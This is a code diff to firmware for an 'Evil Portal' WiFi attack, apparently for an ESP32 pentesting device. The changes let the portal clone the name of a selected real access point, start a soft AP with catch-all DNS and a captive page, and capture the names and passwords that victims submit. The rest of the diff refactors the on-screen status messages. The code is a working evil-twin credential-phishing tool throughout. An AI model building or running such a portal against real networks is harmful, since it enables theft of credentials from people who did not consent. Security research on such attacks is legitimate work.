@@ -10,14 +10,15 @@ EvilPortal::EvilPortal() {
   this->has_ap = false;
 }
 
-bool EvilPortal::begin(LinkedList<ssid>* ssids) {
-  // wait for init flipper input
-  if (!this->setAP(ssids))
+bool EvilPortal::begin(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
+  if (!this->setAP(ssids, access_points))
     return false;
   if (!this->setHtml())
     return false;
     
   startPortal();
+
+  return true;
 }
 
 String EvilPortal::get_user_name() {
@@ -32,6 +33,9 @@ void EvilPortal::setupServer() {
   server.on("/", HTTP_GET, [this](AsyncWebServerRequest *request) {
     request->send_P(200, "text/html", this->index_html);
     Serial.println("client connected");
+    #ifdef HAS_SCREEN
+      this->sendToDisplay("Client connected to server");
+    #endif
   });
 
   server.on("/get", HTTP_GET, [this](AsyncWebServerRequest *request) {
@@ -64,10 +68,8 @@ bool EvilPortal::setHtml() {
     File html_file = sd_obj.getFile("/index.html");
     if (!html_file) {
       #ifdef HAS_SCREEN
-        display_obj.tft.setCursor(0, 100);
-        display_obj.tft.setFreeFont(NULL);
-        display_obj.tft.setTextSize(1);
-        display_obj.tft.println("Could not find /index.html. Touch to exit...");
+        this->sendToDisplay("Could not find /index.html.");
+        this->sendToDisplay("Touch to exit...");
       #endif
       Serial.println("Could not find /index.html. Exiting...");
       return false;
@@ -75,12 +77,9 @@ bool EvilPortal::setHtml() {
     else {
       if (html_file.size() > MAX_HTML_SIZE) {
         #ifdef HAS_SCREEN
-          display_obj.tft.setCursor(0, 100);
-          display_obj.tft.setFreeFont(NULL);
-          display_obj.tft.setTextSize(1);
-          display_obj.tft.println("The provided HTML is too large.");
-          display_obj.tft.println("The Byte limit is " + (String)MAX_HTML_SIZE);
-          display_obj.tft.println("Touch to exit...");
+          this->sendToDisplay("The given HTML is too large.");
+          this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
+          this->sendToDisplay("Touch to exit...");
         #endif
         Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE);
         return false;
@@ -103,61 +102,105 @@ bool EvilPortal::setHtml() {
 
 }
 
-bool EvilPortal::setAP(LinkedList<ssid>* ssids) {
+bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_points) {
+  // See if there are selected APs first
   String ap_config = "";
-  if (ssids->size() <= 0) {
+  String temp_ap_name = "";
+  for (int i = 0; i < access_points->size(); i++) {
+    if (access_points->get(i).selected) {
+      temp_ap_name = access_points->get(i).essid;
+      break;
+    }
+  }
+  // If there are no SSIDs and there are no APs selected, pull from file
+  // This means the file is last resort
+  if ((ssids->size() <= 0) && (temp_ap_name == "")) {
     #ifndef WRITE_PACKETS_SERIAL
       File ap_config_file = sd_obj.getFile("/ap.config.txt");
+      // Could not open config file. return false
       if (!ap_config_file) {
         #ifdef HAS_SCREEN
-          display_obj.tft.setCursor(0, 100);
-          display_obj.tft.setFreeFont(NULL);
-          display_obj.tft.setTextSize(1);
-          display_obj.tft.println("Could not find /ap.config.txt.\nTouch to exit...");
+          this->sendToDisplay("Could not find /ap.config.txt.");
+          this->sendToDisplay("Touch to exit...");
         #endif
         Serial.println("Could not find /ap.config.txt. Exiting...");
         return false;
       }
+      // Config file good. Proceed
       else {
+        // ap name too long. return false        
         if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
           #ifdef HAS_SCREEN
-            display_obj.tft.setCursor(0, 100);
-            display_obj.tft.setFreeFont(NULL);
-            display_obj.tft.setTextSize(1);
-            display_obj.tft.println("The provided AP name is too large.");
-            display_obj.tft.println("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
-            display_obj.tft.println("Touch to exit...");
+            this->sendToDisplay("The given AP name is too large.");
+            this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
+            this->sendToDisplay("Touch to exit...");
           #endif
           Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE);
           return false;
         }
+        // AP name length good. Read from file into var
         while (ap_config_file.available()) {
           char c = ap_config_file.read();
           Serial.print(c);
-          if (isPrintable(c))
+          if (isPrintable(c)) {
             ap_config.concat(c);
+          }
         }
+        #ifdef HAS_SCREEN
+          this->sendToDisplay("AP name from config file");
+          this->sendToDisplay("AP name: " + ap_config);
+        #endif
+        Serial.println("AP name from config file: " + ap_config);
         ap_config_file.close();
       }
     #else
       return false;
     #endif
   }
-  else {
+  // There are SSIDs in the list but there could also be an AP selected
+  // Priority is SSID list before AP selected and config file
+  else if (ssids->size() > 0) {
     ap_config = ssids->get(0).essid;
     if (ap_config.length() > MAX_AP_NAME_SIZE) {
       #ifdef HAS_SCREEN
-        display_obj.tft.setCursor(0, 100);
-        display_obj.tft.setFreeFont(NULL);
-        display_obj.tft.setTextSize(1);
-        display_obj.tft.println("The provided AP name is too large.");
-        display_obj.tft.println("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
-        display_obj.tft.println("Touch to exit...");
+        this->sendToDisplay("The given AP name is too large.");
+        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
+        this->sendToDisplay("Touch to exit...");
       #endif
       Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE);
       return false;
     }
+    #ifdef HAS_SCREEN
+      this->sendToDisplay("AP name from SSID list");
+      this->sendToDisplay("AP name: " + ap_config);
+    #endif
+    Serial.println("AP name from SSID list: " + ap_config);
   }
+  else if (temp_ap_name != "") {
+    if (temp_ap_name.length() > MAX_AP_NAME_SIZE) {
+      #ifdef HAS_SCREEN
+        this->sendToDisplay("The given AP name is too large.");
+        this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
+        this->sendToDisplay("Touch to exit...");
+      #endif
+    }
+    else {
+      ap_config = temp_ap_name;
+      #ifdef HAS_SCREEN
+        this->sendToDisplay("AP name from AP list");
+        this->sendToDisplay("AP name: " + ap_config);
+      #endif
+      Serial.println("AP name from AP list: " + ap_config);
+    }
+  }
+  else {
+    Serial.println("Could not configure Access Point. Exiting...");
+    #ifdef HAS_SCREEN
+      this->sendToDisplay("Could not configure Access Point.");
+      this->sendToDisplay("Touch to exit...");
+    #endif
+  }
+
   if (ap_config != "") {
     strncpy(this->apName, ap_config.c_str(), strlen(ap_config.c_str()));
     this->has_ap = true;
@@ -176,6 +219,10 @@ void EvilPortal::startAP() {
   WiFi.mode(WIFI_AP);
   WiFi.softAP(this->apName);
 
+  #ifdef HAS_SCREEN
+    this->sendToDisplay("AP started");
+  #endif
+
   Serial.print("ap ip address: ");
   Serial.println(WiFi.softAPIP());
 
@@ -184,6 +231,9 @@ void EvilPortal::startAP() {
   this->dnsServer.start(53, "*", WiFi.softAPIP());
   server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);
   server.begin();
+  #ifdef HAS_SCREEN
+    this->sendToDisplay("Evil Portal READY");
+  #endif
 }
 
 void EvilPortal::startPortal() {
@@ -205,8 +255,6 @@ void EvilPortal::convertStringToUint8Array(const String& str, uint8_t*& buf, uin
 }
 
 void EvilPortal::addLog(String log, int len) {
-  //uint8_t *buf;
-  //log.getBytes(buf, strlen(log.c_str()));  
   bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
   if (save_packet) {
     uint8_t* logBuffer = nullptr;
@@ -232,17 +280,14 @@ void EvilPortal::sendToDisplay(String msg) {
     {
       display_string.concat(" ");
     }
-    if (display_obj.display_buffer->size() == 0)
-    {
-      display_obj.loading = true;
-      display_obj.display_buffer->add(display_string);
-      display_obj.loading = false;
-    }
+    display_obj.loading = true;
+    display_obj.display_buffer->add(display_string);
+    display_obj.loading = false;
   #endif
 }
 
 void EvilPortal::main(uint8_t scan_mode) {
-  if (scan_mode == WIFI_SCAN_EVIL_PORTAL) {
+  if ((scan_mode == WIFI_SCAN_EVIL_PORTAL) && (this->has_ap) && (this->has_html)){
     this->dnsServer.processNextRequest();
     if (this->name_received && this->password_received) {
       this->name_received = false;
